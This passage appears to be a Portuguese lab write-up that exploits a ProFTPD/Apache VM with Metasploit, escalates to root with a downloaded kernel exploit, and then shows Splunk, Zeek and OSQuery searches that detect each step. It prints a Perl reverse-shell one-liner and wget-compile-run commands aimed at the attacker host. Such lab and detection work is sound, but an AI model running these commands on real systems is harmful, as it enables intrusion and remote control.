anchorWithStickyNavbar_LWe7" id="splunk">Splunk<a href="#splunk" class="hash-link" aria-label="Direct link to Splunk" title="Direct link to Splunk">​</a></h2><p>Os logs são enviados ao Splunk por meio do agente do <a href="https://nxlog.co/" target="_blank" rel="noopener noreferrer">NXLog</a> pela porta <code>514/udp</code> e caem no index chamado &quot;syslog&quot;. O problema é que esse index ainda não existe. Teremos que configura-lo na mão.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="index">Index<a href="#index" class="hash-link" aria-label="Direct link to Index" title="Direct link to Index">​</a></h3><p>Para configurar um index configurar um index. Basta clicar em <code>Settings</code> &gt; <code>Indexes</code> &gt; <code>New Index</code></p><p><img loading="lazy" alt="settings" src="/en/assets/images/splunk-settings-6c5918c81f3b27aac525f5cdeb86916f.png" width="658" height="586" class="img_ev3q">{: width=&quot;400&quot; heigth=&quot;400&quot;} </p><p>Depois basta colocar o nome e dale:</p><p><img loading="lazy" alt="index" src="/en/assets/images/splunk-settings-index-e7edfbb2621ef4a7b513ecbef65b41da.png" width="808" height="802" class="img_ev3q">{: width=&quot;400&quot; heigth=&quot;400&quot;}</p><p>Feito isso seu lab está pronto para a maldade.</p><h1>Attack</h1><p>O ataque não foi grande coisa. Meu foco era ver como a o ataque poderia ser observado nos logs a fim de exemplificar como pode ser usado.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="scanning">Scanning<a href="#scanning" class="hash-link" aria-label="Direct link to Scanning" title="Direct link to Scanning">​</a></h2><p>Um scan simples com nmap para começar.</p><div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">nmap -sV -p- </span><span class="token number" style="color:#36acaa">192.168</span><span class="token plain">.56.210</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>{: file=&quot;Shell Kali&quot;}</p><p><img loading="lazy" alt="nmap" src="/en/assets/images/nmap1-554281ff45181aac4638277739d51f51.png" width="983" height="384" class="img_ev3q"></p><p>Haviam vários vetores de ataque, fui no primeiro que li na tela rsrs.</p><p>Ao ver a combinação do ProFTP + Apache, podemos supor que temos permissão de gravação no SITEPATH. Então, se explorarmos o serviço ProFTPD podemos abusar da permissão no Apache SITEPATH, o que nos permitirá obter shell reverso. Mas lógico que tudo isso é automático rs, eu só vou aperta um botão. </p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="exploiting">Exploiting<a href="#exploiting" class="hash-link" aria-label="Direct link to Exploiting" title="Direct link to Exploiting">​</a></h2><p>Usando o <code>msfconsole</code> &gt; <code>search proftp</code> e encontrei o exploit <a href="https://www.exploit-db.com/exploits/37262" target="_blank" rel="noopener noreferrer">modcopy execution</a>.</p><div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">use proftpd_modcopy_exec</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">set</span><span class="token plain"> RHOST </span><span class="token number" style="color:#36acaa">192.168</span><span class="token plain">.56.210</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">set</span><span class="token plain"> TARGETURI /</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">set</span><span class="token plain"> SITEPATH /var/www/html/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">set</span><span class="token plain"> payload payload/cmd/unix/reverse_perl</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">set</span><span class="token plain"> LHOST </span><span class="token number" style="color:#36acaa">192.168</span><span class="token plain">.56.109</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exploit</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>{: file=&quot;Shell Kali&quot;}
<img loading="lazy" alt="proftp-exploit.png" src="/en/assets/images/proftp-exploit-cbacd67f53a807680593449da7a03a24.png" width="946" height="395" class="img_ev3q"></p><p>Agora com acesso ao shell, podemos escalonar privilégio.
A história é mais longa do que isso, mas resumindo, usei um exploit para aquele kernel em específico.</p><p>No Kali Linux executei uma busca por aquela versão do kernel no exploitdb, e deixei o código malicioso disponível para download. </p><div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">searchsploit linux </span><span class="token builtin class-name">local</span><span class="token plain"> kernel </span><span class="token number" style="color:#36acaa">3.13</span><span class="token plain"> ubuntu </span><span class="token number" style="color:#36acaa">14.04</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">searchsploit -m </span><span class="token number" style="color:#36acaa">37292</span><span class="token plain">.c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">mv</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">37292</span><span class="token plain">.c /tmp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">python3 -m http.server </span><span class="token number" style="color:#36acaa">80</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>{: file=&quot;Shell Kali&quot;}</p><p><img loading="lazy" alt="searchsploit.png" src="/en/assets/images/searchsploit-446565c82ac1b2043acd838e7f2bd46b.png" width="939" height="402" class="img_ev3q"></p><p>Voltando a console que ganhamos acesso com o usuário www-data, vamos baixar o exploit.</p><div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">wget</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">192.168</span><span class="token plain">.56.109/37292.c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">cd</span><span class="token plain"> tmp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">gcc </span><span class="token number" style="color:#36acaa">37292</span><span class="token plain">.c -o salve</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">./salve</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">whoami</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>{: file=&quot;Shell Web Server&quot;}</p><p><img loading="lazy" alt="salve" src="/en/assets/images/salve-77fe455fd5f76f8124b30ea6063a1b17.png" width="674" height="220" class="img_ev3q"></p><p>Aqui é o fim da exploração, vamos ao lado azul da força ver o que foi loggado ao longo do processo. </p><h1>Detect</h1><p>Vou me basear no Mitre ATT&amp;CK para descrever a técnica usada, e no cyber kill chain para descrever os momentos do ataque. Clique na imagem abaixo para verificar o gráfico.</p><p><img loading="lazy" alt="DectEng.png" src="/en/assets/images/DectEng-16f9cacdfa7925b95d9bf6b52bb424c9.png" width="1353" height="699" class="img_ev3q"></p><ul><li>A curva vai de T₀/M₀ á Mբ/Tբ;</li><li>Observe que para cada tempo Tₛ, temos diferentes capacidades de detecção variando de acordo com a ferramenta que registra aquele momento Mₛ do atacante.</li></ul><h2 class="anchor anchorWithStickyNavbar_LWe7" id="detecting-scan">Detecting Scan<a href="#detecting-scan" class="hash-link" aria-label="Direct link to Detecting Scan" title="Direct link to Detecting Scan">​</a></h2><h3 class="anchor anchorWithStickyNavbar_LWe7" id="detecting-scan---suricata">Detecting Scan - Suricata<a href="#detecting-scan---suricata" class="hash-link" aria-label="Direct link to Detecting Scan - Suricata" title="Direct link to Detecting Scan - Suricata">​</a></h3><p>A seguinte search poderia ser feita para identificar quais origens tem feito comunicação com o web server e quais alertas foram gerados pelo Suricata.</p><div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">index</span><span class="token operator" style="color:#393A34">=</span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> dest_ip</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&quot;192.168.56.210&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> stats </span><span class="token keyword" style="color:#00009f">values</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">src_ip</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">values</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">dest_ip</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">values</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">dest_port</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">values</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">app_proto</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">values</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">alert</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">signature</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">by</span><span class="token plain"> src_ip</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> alert</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">category</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>{: file=&quot;Splunk Search&quot;}</p><p><img loading="lazy" alt="suricata" src="/en/assets/images/suricataXnmap-39389ce00ec333137a75d501142e00af.png" width="1912" height="593" class="img_ev3q">
<em>clique na imagem para expandir</em></p><blockquote><p>Existem outros logs de quando eu ainda estava testando o laboratório, mas a exploração foi feita pelo IP final .109. </p></blockquote><h3 class="anchor anchorWithStickyNavbar_LWe7" id="detecting-scan---zeek">Detecting Scan - Zeek<a href="#detecting-scan---zeek" class="hash-link" aria-label="Direct link to Detecting Scan - Zeek" title="Direct link to Detecting Scan - Zeek">​</a></h3><p>Com as informações da busca anterior, podemos ver com quantos bytes foram trafegados entre os hosts:</p><div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">index</span><span class="token operator" style="color:#393A34">=</span><span class="token operator" style="color:#393A34">*</span><span class="token plain">  id</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">orig_h</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&quot;192.168.56.109&quot;</span><span class="token plain"> id</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">resp_h</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&quot;192.168.56.210&quot;</span><span class="token plain"> sourcetype</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&quot;zeek:json&quot;</span><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> bin span</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">3</span><span class="token plain">min _time </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> stats </span><span class="token keyword" style="color:#00009f">values</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">id</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">orig_h</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">values</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">id</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">resp_h</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">values</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">id</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">resp_p</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">sum</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">orig_ip_bytes</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">sum</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">resp_ip_bytes</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">by</span><span class="token plain"> _time</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>{: file=&quot;Splunk Search&quot;}</p><p><img loading="lazy" alt="zeek" src="/en/assets/images/suricataXnmap-39389ce00ec333137a75d501142e00af.png" width="1912" height="593" class="img_ev3q">
<em>clique na imagem para expandir</em></p><p>Vemos um volume absurdo de variação de portas destino e também dos bytes trafegados.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="detecting-exploit">Detecting Exploit<a href="#detecting-exploit" class="hash-link" aria-label="Direct link to Detecting Exploit" title="Direct link to Detecting Exploit">​</a></h2><h3 class="anchor anchorWithStickyNavbar_LWe7" id="detecting-proftp-exploit---splunk">Detecting ProFTP Exploit - Splunk<a href="#detecting-proftp-exploit---splunk" class="hash-link" aria-label="Direct link to Detecting ProFTP Exploit - Splunk" title="Direct link to Detecting ProFTP Exploit - Splunk">​</a></h3><p>Pelos logs do apache podemos buscar pelo IP do atacante e separar as requisições pelo código de retorno.</p><div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">index</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&quot;syslog&quot;</span><span class="token plain"> Hostname</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&quot;192.168.56.109&quot;</span><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> eval decodedHTTPURL</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">urldecode</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">HTTPURL</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> stats </span><span class="token keyword" style="color:#00009f">values</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">HTTPMethod</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">values</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">decodedHTTPURL</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">by</span><span class="token plain"> HTTPResponseStatus</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> HTTPUserAgent</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>{: file=&quot;Splunk Search&quot;}</p><p><img loading="lazy" alt="apacheperl" src="/en/assets/images/apache_perl-f41a1c5b9d9b0161d37108ccc2c1b7f6.png" width="1899" height="867" class="img_ev3q"></p><p>Encontramos a requisição maliciosa.</p><p>Pelos logs do zeek, temos evidencias das conexões na porta 4444, confirmando o sucesso <strong>de rede</strong> da requisição acima.</p><div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">index</span><span class="token operator" style="color:#393A34">=</span><span class="token operator" style="color:#393A34">*</span><span class="token plain">  id</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">orig_h</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&quot;192.168.56.109&quot;</span><span class="token plain"> id</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">resp_h</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&quot;192.168.56.210&quot;</span><span class="token plain"> id</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">resp_p</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">4444</span><span class="token plain"> sourcetype</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&quot;zeek:json&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> stats </span><span class="token keyword" style="color:#00009f">values</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">id</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">orig_h</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">values</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">id</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">resp_h</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">values</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">id</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">resp_p</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">sum</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">orig_ip_bytes</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">sum</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">resp_ip_bytes</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">by</span><span class="token plain"> _time</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>{: file=&quot;Splunk Search&quot;}</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="detecting-proftp-exploit---osquery">Detecting ProFTP Exploit - OSQuery<a href="#detecting-proftp-exploit---osquery" class="hash-link" aria-label="Direct link to Detecting ProFTP Exploit - OSQuery" title="Direct link to Detecting ProFTP Exploit - OSQuery">​</a></h3><p>Agora á nível de máquina, podemos verificar no OSQuery quais os efeitos do exploit.
Busquei primeiro pelos processos criados que possuem um command line com o IP do atacante.</p><div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">SELECT</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">FROM</span><span class="token plain"> processes </span><span class="token keyword" style="color:#00009f">where</span><span class="token plain"> cmdline </span><span class="token operator" style="color:#393A34">LIKE</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;%192.168.56.109%&#x27;</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>{: file=&quot;OSQuery Search&quot;}
<img loading="lazy" alt="osquery-perl.png" src="/en/assets/images/osquery-perl-7c431467a23b4067296b942f6f3a9398.png" width="1887" height="606" class="img_ev3q"></p><p>Como uma conexão foi estabelecida anteriormente, busquei por sockets abertos com o IP do atacante também:</p><div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">SELECT</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">FROM</span><span class="token plain"> process_open_sockets </span><span class="token keyword" style="color:#00009f">where</span><span class="token plain"> remote_address </span><span class="token operator" style="color:#393A34">=</span><span class="token plain">  </span><span class="token string" style="color:#e3116c">&#x27;192.168.56.109&#x27;</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>{: file=&quot;OSQuery Search&quot;}</p><p><img loading="lazy" alt="osquery-socketremotaddr.png" src="/en/assets/images/osquery-socketremotaddr-6b0fba5445b9c1e729404aca42372538.png" width="1902" height="582" class="img_ev3q"></p><p>Vamos ao estudo do que aconteceu. Quebrando o payload original em partes, e entendendo cada uma delas. O payload executado foi o seguinte:</p><div class="language-perl codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-perl codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">perl -MIO -e &#x27;$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,&quot;192.168.56.109:4444&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);while(&lt;&gt;){if($_=~ /(.*)/){system $1;}};&#x27; &amp;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 